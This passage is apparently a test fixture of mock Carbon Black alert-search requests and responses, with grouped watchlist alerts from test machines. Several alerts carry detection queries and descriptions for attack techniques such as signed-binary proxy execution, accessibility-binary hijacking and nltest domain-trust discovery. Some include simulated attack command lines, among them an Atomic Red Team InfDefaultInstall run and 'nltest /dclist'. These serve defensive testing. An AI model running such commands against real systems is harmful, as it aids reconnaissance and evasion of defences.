    "threat_id": "B0RG",
    "type": "WATCHLIST",
    "workflow": {"status": "OPEN"}
}

GROUP_SEARCH_ALERT_REQUEST = {
    "group_by": {
        "field": "THREAT_ID"
    },
    "time_range": {
        "range": "-10d"
    },
    "criteria": {
        "type": [
            "WATCHLIST"
        ],
        "minimum_severity": 1
    },
    "rows": 1,
    "sort": [
        {
            "field": "count",
            "order": "DESC"
        }
    ]
}

GROUP_SEARCH_ALERT_RESPONSE = {
    "num_found": 6,
    "num_available": 6,
    "results": [
        {
            "count": 1167,
            "workflow_states": {
                "OPEN": 1167
            },
            "determination_values": {
                "NONE": 1167
            },
            "ml_classification_final_verdicts": {},
            "first_alert_timestamp": "2023-10-20T17:57:41.734Z",
            "last_alert_timestamp": "2023-10-30T17:19:22.943Z",
            "highest_severity": 1,
            "policy_applied": "NOT_APPLIED",
            "threat_notes_present": False,
            "tags": [],
            "device_count": 11,
            "workload_count": 0,
            "most_recent_alert": {
                "org_key": "ABCD1234",
                "alert_url": "defense.conferdeploy.net/alerts?s[c][query_string]=\
    id:887e6bbc-6224-4f36-ad37-084038b7fcab&orgKey=ABC12345",
                "id": "d6f05ce5-23ad-4cf0-a4d8-ee564396b2d1",
                "type": "WATCHLIST",
                "backend_timestamp": "2023-10-30T17:32:02.851Z",
                "user_update_timestamp": None,
                "backend_update_timestamp": "2023-10-30T17:32:02.851Z",
                "detection_timestamp": "2023-10-30T17:30:04.587Z",
                "first_event_timestamp": "2023-10-30T17:19:22.943Z",
                "last_event_timestamp": "2023-10-30T17:19:22.943Z",
                "severity": 1,
                "reason": "Process cmd.exe was detected by the report \"scale and performance test report\" in "
                          "watchlist \"perf_automation_feed_qrcialhx\"",
                "reason_code": "5319dc28-4f8b-3a9f-84c6-e045c5e186ff:920e0ded-e95b-3d77-8eaa-e28bdaa133f2",
                "threat_id": "5319DC284F8B2A9FC4C6E045C5E186FF",
                "primary_event_id": "o6NwqERTQf6eYlD0kvpRLw-0",
                "policy_applied": "NOT_APPLIED",
                "run_state": "RAN",
                "sensor_action": "ALLOW",
                "workflow": {
                    "change_timestamp": "2023-10-30T17:32:02.851Z",
                    "changed_by_type": "SYSTEM",
                    "changed_by": "ALERT_CREATION",
                    "closure_reason": "NO_REASON",
                    "status": "OPEN"
                },
                "determination": {
                    "change_timestamp": "2023-10-30T17:32:02.851Z",
                    "value": "NONE",
                    "changed_by_type": "SYSTEM",
                    "changed_by": "ALERT_CREATION"
                },
                "tags": None,
                "alert_notes_present": False,
                "threat_notes_present": False,
                "asset_id": None,
                "is_updated": False,
                "device_id": 18118176,
                "device_name": "pscr-test-01-1677785033.788122-22",
                "device_uem_id": "",
                "device_target_value": "LOW",
                "device_policy": "Pscr SE Testing",
                "device_policy_id": 465946,
                "device_os": "WINDOWS",
                "device_os_version": "Windows 10 x64 SP: 1",
                "device_username": "pscr-test-01-1677785033.788122-22@carbonblack.com",
                "device_location": "UNKNOWN",
                "device_external_ip": "10.10.10.10",
                "mdr_alert": False,
                "mdr_alert_notes_present": False,
                "mdr_threat_notes_present": False,
                "report_id": "vnbrUmClRh2Mh8398QtJww-scale_perf_automation_report01_qrcialhx",
                "report_name": "scale and performance test report",
                "report_description": "scale and performance test description",
                "report_tags": [],
                "ioc_id": "scale_perf_automation_report01_ioc01_qrcialhx",
                "ioc_hit": "process_name:cmd.exe",
                "watchlists": [
                    {
                        "id": "gSpaq0J9QB1qRY3lEdAw",
                        "name": "perf_automation_feed_qrcialhx"
                    }
                ],
                "process_guid": "ABCD1234-01147620-00780012-00000000-19db1ded53e8000",
                "process_pid": 7864338,
                "process_name": "cmd.exe",
                "process_sha256": "bb5743ff9ce542b7018d712597b2f3e2868e89feaf8d76253324644fbeda1899",
                "process_md5": "0a56e038d66da45947f8fdf130aef2d5",
                "process_effective_reputation": "LOCAL_WHITE",
                "process_reputation": "NOT_LISTED",
                "process_cmdline": "cmd.exe /c InfDefaultInstall.exe C:\\Users\\bit9qa\\AtomicRedTeam\\"
                                   "atomic-red-team-vmware-develop\\atomics\\T1218\\src\\Infdefaultinstall.inf",
                "process_username": "NT AUTHORITY\\SYSTEM",
                "process_issuer": [
                    "Moravec Code Signing CA - G2"
                ],
                "process_publisher": [
                    "Moravec Test Authority"
                ],
                "childproc_guid": "",
                "childproc_username": "",
                "childproc_cmdline": ""
            }
        },
        {
            "count": 623,
            "workflow_states": {
                "OPEN": 623
            },
            "determination_values": {
                "NONE": 623
            },
            "ml_classification_final_verdicts": {},
            "first_alert_timestamp": "2023-10-20T19:05:14.179Z",
            "last_alert_timestamp": "2023-10-30T17:27:55.845Z",
            "highest_severity": 5,
            "policy_applied": "NOT_APPLIED",
            "threat_notes_present": False,
            "tags": [],
            "device_count": 5,
            "workload_count": 0,
            "most_recent_alert": {
                "org_key": "ABCD1234",
                "alert_url": "defense.conferdeploy.net/alerts?s[c][query_string]=\
    id:887e6bbc-6224-4f36-ad37-084038b7fcab&orgKey=ABC12345",
                "id": "9ae95e50-93a2-4b84-b6b0-0442be20b690",
                "type": "WATCHLIST",
                "backend_timestamp": "2023-10-30T17:36:05.423Z",
                "user_update_timestamp": None,
                "backend_update_timestamp": "2023-10-30T17:36:05.423Z",
                "detection_timestamp": "2023-10-30T17:35:16.949Z",
                "first_event_timestamp": "2023-10-30T17:27:55.845Z",
                "last_event_timestamp": "2023-10-30T17:27:55.845Z",
                "severity": 5,
                "reason": "Process trustedinstaller.exe was detected by the report \"mdr-th-test-r-1\" in watchlist "
                          "\"mdr-th-test-1\"",
                "reason_code": "daa13aef-606f-3d75-a123-f8169b1c8a91:caf657fc-2aa9-3f4a-ad4b-9f41faa8cb30",
                "threat_id": "DAA13AEF606F1D752123F8169B1C8A91",
                "primary_event_id": "vl8Z5QbSQ5qmFs19P2S-gw-0",
                "policy_applied": "NOT_APPLIED",
                "run_state": "RAN",
                "sensor_action": "ALLOW",
                "workflow": {
                    "change_timestamp": "2023-10-30T17:36:05.423Z",
                    "changed_by_type": "SYSTEM",
                    "changed_by": "ALERT_CREATION",
                    "closure_reason": "NO_REASON",
                    "status": "OPEN"
                },
                "determination": {
                    "change_timestamp": "2023-10-30T17:36:05.423Z",
                    "value": "NONE",
                    "changed_by_type": "SYSTEM",
                    "changed_by": "ALERT_CREATION"
                },
                "tags": None,
                "alert_notes_present": False,
                "threat_notes_present": False,
                "asset_id": None,
                "is_updated": False,
                "device_id": 18919907,
                "device_name": "DO-NOT-UPGRADE-3DOT9-1",
                "device_uem_id": "",
                "device_target_value": "LOW",
                "device_policy": "Pscr SE Testing",
                "device_policy_id": 465946,
                "device_os": "WINDOWS",
                "device_os_version": "Windows 10 x64",
                "device_location": "UNKNOWN",
                "device_external_ip": "10.10.10.10",
                "device_internal_ip": "10.10.10.10",
                "mdr_alert": False,
                "mdr_alert_notes_present": False,
                "mdr_threat_notes_present": False,
                "report_id": "qzZl6z5WRjiyazX3aZtiiQ",
                "report_name": "mdr-th-test-r-1",
                "report_tags": [],
                "ioc_id": "2614a883-1c0d-4ece-92b8-f733c7dec0a3",
                "ioc_hit": "(process_name:trustedinstaller.exe)",
                "watchlists": [
                    {
                        "id": "tUKo4HPQYWVqZlYhnUTSw",
                        "name": "mdr-th-test-1"
                    }
                ],
                "process_guid": "ABCD1234-0120b1e3-0000062c-00000000-1da0b5622b36c32",
                "process_pid": 1580,
                "process_name": "c:\\windows\\servicing\\trustedinstaller.exe",
                "process_sha256": "2a47e31b708c2ab1d0b4a40802b56c49505361ffb275e4b4c14370b3bfc12245",
                "process_md5": "9ab25e301dac8a8f6cf14d51e7284545",
                "process_effective_reputation": "ADAPTIVE_WHITE_LIST",
                "process_reputation": "NOT_LISTED",
                "process_cmdline": "C:\\WINDOWS\\servicing\\TrustedInstaller.exe",
                "process_username": "NT AUTHORITY\\SYSTEM",
                "process_issuer": [
                    "Microsoft Windows Production PCA 2011"
                ],
                "process_publisher": [
                    "Microsoft Windows"
                ],
                "parent_guid": "ABCD1234-0120b1e3-000002c0-00000000-1d9fbf60e8b2a59",
                "parent_pid": 704,
                "parent_name": "c:\\windows\\system32\\services.exe",
                "parent_sha256": "f016360c75e8250af691929082ba2066078fba4e84eac3d496e4eda9a0b6ec62",
                "parent_md5": "f26f9b26e933078756832b864eb627b7",
                "parent_effective_reputation": "LOCAL_WHITE",
                "parent_reputation": "NOT_LISTED",
                "parent_cmdline": "C:\\WINDOWS\\system32\\services.exe",
                "parent_username": "NT AUTHORITY\\SYSTEM",
                "childproc_guid": "",
                "childproc_username": "",
                "childproc_cmdline": ""
            }
        },
        {
            "count": 531,
            "workflow_states": {
                "OPEN": 531
            },
            "determination_values": {
                "NONE": 531
            },
            "ml_classification_final_verdicts": {},
            "first_alert_timestamp": "2023-10-20T17:57:41.672Z",
            "last_alert_timestamp": "2023-10-30T14:56:59.838Z",
            "highest_severity": 5,
            "policy_applied": "NOT_APPLIED",
            "threat_notes_present": True,
            "tags": [],
            "device_count": 5,
            "workload_count": 0,
            "most_recent_alert": {
                "org_key": "ABCD1234",
                "alert_url": "defense.conferdeploy.net/alerts?s[c][query_string]=\
    id:887e6bbc-6224-4f36-ad37-084038b7fcab&orgKey=ABC12345",
                "id": "1d2ada91-13c8-4d8f-8d13-fb3a8f5a938b",
                "type": "WATCHLIST",
                "backend_timestamp": "2023-10-30T15:07:02.935Z",
                "user_update_timestamp": None,
                "backend_update_timestamp": "2023-10-30T15:07:02.935Z",
                "detection_timestamp": "2023-10-30T15:04:21.445Z",
                "first_event_timestamp": "2023-10-30T14:56:59.838Z",
                "last_event_timestamp": "2023-10-30T14:56:59.838Z",
                "severity": 5,
                "reason": "Process dllhost.exe was detected by the report \"test-wl-r-567\" in watchlist "
                          "\"test-wl-g-567\"",
                "reason_code": "1b32b7cf-7c3d-30f1-97b4-6ec2e39530c9:627bbdfe-55a7-3100-89bc-25d618fb9684",
                "threat_id": "1B32B7CF7C3D40F117B46EC2E39530C9",
                "primary_event_id": "kte8_LXBTCurOS1NRFkNcw-0",
                "policy_applied": "NOT_APPLIED",
                "run_state": "RAN",
                "sensor_action": "ALLOW",
                "workflow": {
                    "change_timestamp": "2023-10-30T15:07:02.935Z",
                    "changed_by_type": "SYSTEM",
                    "changed_by": "ALERT_CREATION",
                    "closure_reason": "NO_REASON",
                    "status": "OPEN"
                },
                "determination": {
                    "change_timestamp": "2023-10-30T15:07:02.935Z",
                    "value": "NONE",
                    "changed_by_type": "SYSTEM",
                    "changed_by": "ALERT_CREATION"
                },
                "tags": None,
                "alert_notes_present": False,
                "threat_notes_present": True,
                "asset_id": None,
                "is_updated": False,
                "device_id": 18919907,
                "device_name": "DO-NOT-UPGRADE-3DOT9-1",
                "device_uem_id": "",
                "device_target_value": "LOW",
                "device_policy": "Pscr SE Testing",
                "device_policy_id": 465946,
                "device_os": "WINDOWS",
                "device_os_version": "Windows 10 x64",
                "device_location": "UNKNOWN",
                "device_external_ip": "10.10.10.10",
                "device_internal_ip": "10.10.10.10",
                "mdr_alert": False,
                "mdr_alert_notes_present": False,
                "mdr_threat_notes_present": False,
                "report_id": "Q0O2FxEWSy2fSSYxEs2Pg",
                "report_name": "test-wl-r-567",
                "report_tags": [],
                "ioc_id": "529de965-e1f6-4e7d-a37e-9e392da29740",
                "ioc_hit": "(process_name:dllhost.exe)",
                "watchlists": [
                    {
                        "id": "6m1NPFvAR9cN183DNEEOQ",
                        "name": "test-wl-g-567"
                    }
                ],
                "process_guid": "ABCD1234-0120b1e3-00001e3c-00000000-1d9fbf6bbaf6d5d",
                "process_pid": 7740,
                "process_name": "c:\\windows\\system32\\dllhost.exe",
                "process_sha256": "8477a5238c237df3ab0454cfef3df7d82162d3c72f8325a840c02558aa8b3e20",
                "process_md5": "e3cd542b90fe84453ef3400278eb4d9c",
                "process_effective_reputation": "ADAPTIVE_WHITE_LIST",
                "process_reputation": "NOT_LISTED",
                "process_cmdline": "C:\\WINDOWS\\system32\\DllHost.exe "
                                   "/Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}",
                "process_username": "DO-NOT-UPGRADE-\\bit9qa",
                "process_issuer": [
                    "Microsoft Windows Production PCA 2011"
                ],
                "process_publisher": [
                    "Microsoft Windows"
                ],
                "parent_guid": "ABCD1234-0120b1e3-0000033c-00000000-1d9fbf60ee12039",
                "parent_pid": 828,
                "parent_name": "c:\\windows\\system32\\svchost.exe",
                "parent_sha256": "dab2ad1e12aebebceef118504165130e0585faae88d56cfc06b3905bdb18d021",
                "parent_md5": "d4461ec74a79986aaab9ef3312c961f4",
                "parent_effective_reputation": "LOCAL_WHITE",
                "parent_reputation": "NOT_LISTED",
                "parent_cmdline": "C:\\WINDOWS\\system32\\svchost.exe -k DcomLaunch -p",
                "parent_username": "NT AUTHORITY\\SYSTEM",
                "childproc_guid": "",
                "childproc_username": "",
                "childproc_cmdline": ""
            }
        },
        {
            "count": 10,
            "workflow_states": {
                "CLOSED": 10
            },
            "determination_values": {
                "NONE": 10
            },
            "ml_classification_final_verdicts": {
                "NOT_ANOMALOUS": 10
            },
            "first_alert_timestamp": "2023-10-21T15:17:46.070Z",
            "last_alert_timestamp": "2023-10-30T15:18:03.361Z",
            "highest_severity": 9,
            "policy_applied": "NOT_APPLIED",
            "threat_notes_present": False,
            "tags": [
                "kylie"
            ],
            "device_count": 1,
            "workload_count": 0,
            "most_recent_alert": {
                "org_key": "ABCD1234",
                "alert_url": "defense.conferdeploy.net/alerts?s[c][query_string]=\
    id:887e6bbc-6224-4f36-ad37-084038b7fcab&orgKey=ABC12345",
                "id": "ecbc7e05-356f-4cbf-b2fd-fa37f8e67b9a",
                "type": "WATCHLIST",
                "backend_timestamp": "2023-10-30T15:21:45.395Z",
                "user_update_timestamp": None,
                "backend_update_timestamp": "2023-10-30T15:21:45.395Z",
                "detection_timestamp": "2023-10-30T15:20:05.118Z",
                "first_event_timestamp": "2023-10-30T15:18:03.361Z",
                "last_event_timestamp": "2023-10-30T15:18:03.361Z",
                "severity": 9,
                "reason": "Process mftrace.exe was detected by the report \"Defense Evasion - Signed Binary Proxy "
                          "Execution - mftrace.exe\" in 6 watchlists",
                "reason_code": "7103e507-8440-37be-a035-1a50d8773029:5510c3f4-6fe1-314b-bc87-f0ef2ee47734",
                "threat_id": "7103E507844087BE20351A50D8773029",
                "primary_event_id": "Rc6Y6xqaSbOnrtVfz5cLLA-0",
                "policy_applied": "NOT_APPLIED",
                "run_state": "RAN",
                "sensor_action": "ALLOW",
                "workflow": {
                    "change_timestamp": "2023-10-30T15:21:45.395Z",
                    "changed_by_type": "SYSTEM",
                    "changed_by": "AUTO_DISMISSAL",
                    "closure_reason": "NO_REASON",
                    "status": "CLOSED"
                },
                "determination": {
                    "change_timestamp": "2023-10-30T15:21:45.395Z",
                    "value": "NONE",
                    "changed_by_type": "SYSTEM",
                    "changed_by": "ALERT_CREATION"
                },
                "tags": [
                    "kylie"
                ],
                "alert_notes_present": False,
                "threat_notes_present": False,
                "asset_id": None,
                "is_updated": False,
                "device_id": 18101454,
                "device_name": "pscr-test-01-1677257450.4625878-20",
                "device_uem_id": "",
                "device_target_value": "LOW",
                "device_policy": "Pscr SE Testing",
                "device_policy_id": 465946,
                "device_os": "WINDOWS",
                "device_os_version": "Windows 10 x64 SP: 1",
                "device_username": "pscr-test-01-1677257450.4625878-20@carbonblack.com",
                "device_location": "UNKNOWN",
                "device_external_ip": "10.10.10.10",
                "mdr_alert": False,
                "mdr_alert_notes_present": False,
                "mdr_threat_notes_present": False,
                "report_id": "oJFtoawGS92fVMXlELC1Ow-139cafcc-a365-4bec-8d72-602c35f1e150",
                "report_name": "Defense Evasion - Signed Binary Proxy Execution - mftrace.exe",
                "report_description": "Binaries signed with trusted digital certificates can execute on Windows "
                                      "systems protected by digital signature validation. Several Microsoft signed "
                                      "binaries that are default on Windows installations can be used to proxy "
                                      "execution of other files.\n\nThreat:\nThis behavior may be abused by adversaries"
                                      " to execute malicious files that could bypass application whitelisting and "
                                      "signature validation on systems.\n\nFalse Positives:\nAs these are techniques "
                                      "that leverage living off the land binaries, False positives may occur in some "
                                      "environments.\n\nScore:\n90",
                "report_tags": [
                    "attack",
                    "attackframework",
                    "threathunting",
                    "hunting",
                    "evasion",
                    "execution",
                    "t1218",
                    "lolbin",
                    "windows",
                    "mftrace"
                ],
                "report_link": "https://attack.mitre.org/wiki/Technique/T1218",
                "ioc_id": "139cafcc-a365-4bec-8d72-602c35f1e150-0",
                "ioc_hit": "((process_name:mftrace.exe)) -enriched:True",
                "watchlists": [
                    {
                        "id": "9x0timurQkqP7FBKX4XrUw",
                        "name": "Carbon Black Advanced Threats"
                    },
                    {
                        "id": "Cp5DTDiDRcah99nrcIz4Vw",
                        "name": "My Watchlist 2"
                    },
                    {
                        "id": "b3l462JEQIK6cECXibgXBg",
                        "name": "My Watchlist 4"
                    },
                    {
                        "id": "lJH9nbKbSRKhMtTR6ME35A",
                        "name": "test Watchlist"
                    },
                    {
                        "id": "mBP84PY8SyOFJTKzJbmNQ",
                        "name": "My Watchlist 3"
                    },
                    {
                        "id": "u9E3dfpJTMaKX0dSBtyIqQ",
                        "name": "My Watchlist"
                    }
                ],
                "process_guid": "ABCD1234-011434ce-0000d2a0-00000000-19db1ded53e8000",
                "process_pid": 53920,
                "process_name": "mftrace.exe",
                "process_sha256": "5b60148e8666a458f804e5d0fe925a9f55cf016733458c58c1980addc44cd774",
                "process_md5": "49eb775894a49f13193513b0138f72a9",
                "process_effective_reputation": "LOCAL_WHITE",
                "process_reputation": "NOT_LISTED",
                "process_cmdline": "c:\\program files (x86)\\svchost.exe \\qwer sad olasdjf",
                "process_username": "CB INTERNAL\\USER_1",
                "process_issuer": [
                    "Moravec Code Signing CA - G2"
                ],
                "process_publisher": [
                    "Moravec Test Authority"
                ],
                "childproc_guid": "",
                "childproc_username": "",
                "childproc_cmdline": "",
                "ml_classification_final_verdict": "NOT_ANOMALOUS",
                "ml_classification_global_prevalence": "LOW",
                "ml_classification_org_prevalence": "LOW"
            }
        },
        {
            "count": 2,
            "workflow_states": {
                "OPEN": 2
            },
            "determination_values": {
                "NONE": 2
            },
            "ml_classification_final_verdicts": {
                "NOT_CLASSIFIED": 2
            },
            "first_alert_timestamp": "2023-10-26T14:26:59.477Z",
            "last_alert_timestamp": "2023-10-26T14:26:59.477Z",
            "highest_severity": 9,
            "policy_applied": "NOT_APPLIED",
            "threat_notes_present": False,
            "tags": [],
            "device_count": 1,
            "workload_count": 0,
            "most_recent_alert": {
                "org_key": "ABCD1234",
                "alert_url": "defense.conferdeploy.net/alerts?s[c][query_string]=\
    id:887e6bbc-6224-4f36-ad37-084038b7fcab&orgKey=ABC12345",
                "id": "d76b25d2-e103-4522-b48e-30a28fd7f1dc",
                "type": "WATCHLIST",
                "backend_timestamp": "2023-10-26T14:29:54.345Z",
                "user_update_timestamp": None,
                "backend_update_timestamp": "2023-10-26T14:29:54.345Z",
                "detection_timestamp": "2023-10-26T14:28:05.243Z",
                "first_event_timestamp": "2023-10-26T14:26:59.477Z",
                "last_event_timestamp": "2023-10-26T14:26:59.477Z",
                "severity": 9,
                "reason": "Process dismhost.exe was detected by the report \"Persistence - Accessibility Feature "
                          "Hijacking - Sethc.exe or Utilman.exe\" in 6 watchlists",
                "reason_code": "5495b4de-a32b-35d3-9778-0a5b02338640:bc0cc6c3-f6a9-340b-ad5d-07ff07794d1e",
                "threat_id": "5495B4DEA32BC5D3D7780A5B02338640",
                "primary_event_id": "PRR3ViutQqmwLXyNmtS-Ew-0",
                "policy_applied": "NOT_APPLIED",
                "run_state": "RAN",
                "sensor_action": "ALLOW",
                "workflow": {
                    "change_timestamp": "2023-10-26T14:29:54.345Z",
                    "changed_by_type": "SYSTEM",
                    "changed_by": "ALERT_CREATION",
                    "closure_reason": "NO_REASON",
                    "status": "OPEN"
                },
                "determination": {
                    "change_timestamp": "2023-10-26T14:29:54.345Z",
                    "value": "NONE",
                    "changed_by_type": "SYSTEM",
                    "changed_by": "ALERT_CREATION"
                },
                "tags": None,
                "alert_notes_present": False,
                "threat_notes_present": False,
                "asset_id": None,
                "is_updated": False,
                "device_id": 17853591,
                "device_name": "Win10x64v2004",
                "device_uem_id": "",
                "device_target_value": "LOW",
                "device_policy": "Pscr SE Testing",
                "device_policy_id": 465946,
                "device_os": "WINDOWS",
                "device_os_version": "Windows 10 x64",
                "device_location": "UNKNOWN",
                "device_external_ip": "10.10.10.10",
                "device_internal_ip": "10.10.10.10",
                "mdr_alert": False,
                "mdr_alert_notes_present": False,
                "mdr_threat_notes_present": False,
                "report_id": "oJFtoawGS92fVMXlELC1Ow-92de6c37-c143-4201-a0ea-973fca8f0dec",
                "report_name": "Persistence - Accessibility Feature Hijacking - Sethc.exe or Utilman.exe",
                "report_description": "This query looks for indications of sethc.exe or utilman.exe being replaced. "
                                      "This behavior can be a leading indicator of adversary persistence or privilege "
                                      "escalation.\n\nThreat:\nAdversaries can replace accessibility feature binaries "
                                      "with alternate binaries. This behavior has been publicly observed by both APT3 "
                                      "and APT29.\n\nFalse Positives:\nThese files may be legitimately replaced via "
                                      "system update activity.\n\nScore:\n90",
                "report_tags": [
                    "backdoor",
                    "persistence",
                    "attackframework",
                    "attack",
                    "t1546",
                    "privesc",
                    "windows"
                ],
                "report_link": "https://community.carbonblack.com/t5/Threat-Research-Docs/Cb-Response-Advanced-Threats"
                               "-Threat-Intel-Feed/ta-p/38756",
                "ioc_id": "92de6c37-c143-4201-a0ea-973fca8f0dec-0",
                "ioc_hit": "(((filemod_name:system32\\\\sethc.exe OR filemod_name:SysArm32\\\\sethc.exe OR filemod_"
                           "name:system32\\\\utilman.exe OR filemod_name:SysArm32\\\\utilman.exe) -(process_name:"
                           "windows\\\\system32\\\\poqexec.exe OR process_name:windows\\\\system32\\\\wbengine.exe OR "
                           "process_name:sources\\\\setuphost.exe OR parent_name:wuauclt.exe OR process_name:"
                           "windows\\\\system32\\\\dism.exe OR process_name:windows\\\\SysArm32\\\\dism.exe OR process_"
                           "name:windows\\\\ccmcache\\\\* OR process_name:sources\\\\setupprep.exe OR process_name:"
                           "sources\\\\setupplatform.exe OR process_name:windows\\\\servicing\\\\trustedinstaller.exe "
                           "OR process_name:windows\\\\system32\\\\taskhostw.exe OR process_name:windows\\\\system32"
                           "\\\\cleanmgr.exe OR process_name:windows\\\\SysArm32\\\\cleanmgr.exe OR process_name:"
                           "windows\\\\softwaredistribution\\\\download\\\\*\\\\windowsupdatebox.exe OR process_cmdline"
                           ":\"localsystemnetworkrestricted\\ \\-p\\ \\-s\\ hvsics\"))) -enriched:True",
                "watchlists": [
                    {
                        "id": "9x0timurQkqP7FBKX4XrUw",
                        "name": "Carbon Black Advanced Threats"
                    },
                    {
                        "id": "Cp5DTDiDRcah99nrcIz4Vw",
                        "name": "My Watchlist 2"
                    },
                    {
                        "id": "b3l462JEQIK6cECXibgXBg",
                        "name": "My Watchlist 4"
                    },
                    {
                        "id": "lJH9nbKbSRKhMtTR6ME35A",
                        "name": "test Watchlist"
                    },
                    {
                        "id": "mBP84PY8SyOFJTKzJbmNQ",
                        "name": "My Watchlist 3"
                    },
                    {
                        "id": "u9E3dfpJTMaKX0dSBtyIqQ",
                        "name": "My Watchlist"
                    }
                ],
                "process_guid": "ABCD1234-01106c97-000011e0-00000000-1da080d2ad07e3c",
                "process_pid": 4576,
                "process_name": "c:\\$windows.~bt\\work\\8952c707-3efc-4f94-bc75-6973c12d1042\\dismhost.exe",
                "process_sha256": "21baef2bb5ab2df3aa4d95c8333aadadda61dee65e61ad2dbe5f3dbaddb163c7",
                "process_md5": "80e6c06c378bc7c382c23b1d643cd7d2",
                "process_effective_reputation": "TRUSTED_WHITE_LIST",
                "process_reputation": "ADAPTIVE_WHITE_LIST",
                "process_cmdline": "C:\\$WINDOWS.~BT\\Work\\8952C707-3EFC-4F94-BC75-6973C12D1042\\dismhost.exe "
                                   "{7F60B69D-4182-422C-8D9E-C9EFF8C25564}",
                "process_username": "NT AUTHORITY\\SYSTEM",
                "process_issuer": [
                    "Microsoft Windows Production PCA 2011"
                ],
                "process_publisher": [
                    "Microsoft Windows"
                ],
                "parent_guid": "ABCD1234-01106c97-0000120c-00000000-1da08070d71d31d",
                "parent_pid": 4620,
                "parent_name": "c:\\$windows.~bt\\sources\\setuphost.exe",
                "parent_sha256": "c3cda09375ef70d98778eeb60b57063e9bee9c6d339bfe9c78a109505fb0aef5",
                "parent_md5": "328c3c5398356a671cf7ccc2d63dbd31",
                "parent_effective_reputation": "ADAPTIVE_WHITE_LIST",
                "parent_reputation": "NOT_LISTED",
                "parent_cmdline": "\"C:\\$WINDOWS.~BT\\Sources\\SetupHost.Exe\" /Install /Package /Quiet  /ReportId "
                                  "2A023074-E74A-493D-86C9-BE98C74B5658.1 /FlightData \"RS:18AB8\" \"/CancelId\" \""
                                  "C-0f1b3704-a1e1-4ee9-95bd-0acfc322d310\" \"/PauseId\" \"P-0f1b3704-a1e1-4ee9-95bd-"
                                  "0acfc322d310\" \"/CorrelationVector\" \"4LUJMlgxQkm8FZbm.46.2.2.115\" \"/"
                                  "ActionListFile\" \"C:\\WINDOWS\\SoftwareDistribution\\Download\\"
                                  "23df863fededce875f9108f92ea08646\\ActionList.xml\" ",
                "parent_username": "NT AUTHORITY\\SYSTEM",
                "childproc_guid": "",
                "childproc_username": "",
                "childproc_cmdline": "",
                "ml_classification_final_verdict": "NOT_CLASSIFIED",
                "ml_classification_global_prevalence": "HIGH",
                "ml_classification_org_prevalence": "HIGH"
            }
        },
        {
            "count": 2,
            "workflow_states": {
                "OPEN": 2
            },
            "determination_values": {
                "NONE": 2
            },
            "ml_classification_final_verdicts": {},
            "first_alert_timestamp": "2023-10-11T19:39:46.639Z",
            "last_alert_timestamp": "2023-10-11T19:46:23.393Z",
            "highest_severity": 4,
            "policy_applied": "NOT_APPLIED",
            "threat_notes_present": False,
            "tags": [],
            "device_count": 2,
            "workload_count": 0,
            "most_recent_alert": {
                "org_key": "ABCD1234",
                "alert_url": "defense.conferdeploy.net/alerts?s[c][query_string]=\
    id:887e6bbc-6224-4f36-ad37-084038b7fcab&orgKey=ABC12345",
                "id": "28f2228c-48e2-4ce7-a3e9-8a355dedbb6a",
                "type": "WATCHLIST",
                "backend_timestamp": "2023-10-25T11:24:28.759Z",
                "user_update_timestamp": "2023-10-25T11:24:29.739Z",
                "backend_update_timestamp": "2023-10-25T11:24:28.759Z",
                "detection_timestamp": "2023-10-25T11:21:49.224Z",
                "first_event_timestamp": "2023-10-11T19:46:23.393Z",
                "last_event_timestamp": "2023-10-11T19:46:23.393Z",
                "severity": 4,
                "reason": "Process nltest.exe was detected by the report \"Discovery - NLTest Domain Trust Enumeration"
                          "\" in watchlist \"Managed Detection and Response Intelligence\"",
                "reason_code": "7177ff6d-0968-3481-953e-773f9eaf11af:7e088273-7d5f-3e8d-87ca-b026c15ad163",
                "threat_id": "7177FF6D0968F481553E773F9EAF11AF",
                "primary_event_id": "vvAsddw1QYK-RdQMV0_v_w-0",
                "policy_applied": "NOT_APPLIED",
                "run_state": "RAN",
                "sensor_action": "ALLOW",
                "workflow": {
                    "change_timestamp": "2023-10-25T11:24:28.759Z",
                    "changed_by_type": "SYSTEM",
                    "changed_by": "ALERT_CREATION",
                    "closure_reason": "NO_REASON",
                    "status": "OPEN"
                },
                "determination": {
                    "change_timestamp": "2023-10-25T11:24:28.759Z",
                    "value": "NONE",
                    "changed_by_type": "SYSTEM",
                    "changed_by": "ALERT_CREATION"
                },
                "tags": None,
                "alert_notes_present": False,
                "threat_notes_present": False,
                "asset_id": None,
                "is_updated": False,
                "device_id": 19013608,
                "device_name": "3dot5-do-not-upgrade",
                "device_uem_id": "",
                "device_target_value": "LOW",
                "device_policy": "pscr se testing",
                "device_policy_id": 465946,
                "device_os": "WINDOWS",
                "device_os_version": "Windows 10 x64",
                "device_location": "UNKNOWN",
                "device_external_ip": "10.10.10.10",
                "device_internal_ip": "10.10.10.10",
                "mdr_alert": True,
                "mdr_workflow": {
                    "change_timestamp": "2023-10-25T11:24:29.739Z",
                    "status": "TRIAGE_COMPLETE",
                    "is_assigned": True
                },
                "mdr_determination": {
                    "change_timestamp": "2023-10-25T11:24:29.739Z",
                    "value": "LIKELY_THREAT"
                },
                "mdr_alert_notes_present": False,
                "mdr_threat_notes_present": False,
                "report_id": "Hf02hPgRSODd1tiEbUnw-1AA42B3F-B323-41A3-B924-31EA00C9C2CF",
                "report_name": "Discovery - NLTest Domain Trust Enumeration",
                "report_description": "Attackers may leverage the nltest command to discover domain trusts. This "
                                      "technique requires the installation of nltest via Windows RSAT or the Windows "
                                      "Server AD DS role.",
                "report_tags": [
                    "nltest",
                    "discovery",
                    "t1482",
                    "attackframework",
                    "attack",
                    "windows"
                ],
                "report_link": "https://attack.mitre.org/techniques/T1482/",
                "ioc_id": "1AA42B3F-B323-41A3-B924-31EA00C9C2CF",
                "ioc_hit": "(process_name:nltest.exe....",
                "watchlists": [
                    {
                        "id": "5A93z6EISzSY8M8AUhzBjg",
                        "name": "Managed Detection and Response Intelligence"
                    }
                ],
                "threat_hunt_id": "845cac53-01ff-4e11-9c8d-a2eb5c1ac048",
                "threat_hunt_name": "test preview",
                "process_guid": "ABCD1234-01221fe8-00002074-00000000-1d9fc7b9a83015b",
                "process_pid": 8308,
                "process_name": "c:\\windows\\system32\\nltest.exe",
                "process_sha256": "50742fc1c1af7bfb5a58af2c7d19a0d552a9c4493b1b972139f56927c25197aa",
                "process_md5": "ebbc96ce1a4e2365822bb13b88950ee1",
                "process_effective_reputation": "NOT_LISTED",
                "process_reputation": "NOT_LISTED",
                "process_cmdline": "nltest.exe  /dclist:%userdnsdomain%",
                "process_username": "3DOT5-DO-NOT-UP\\bit9qa",
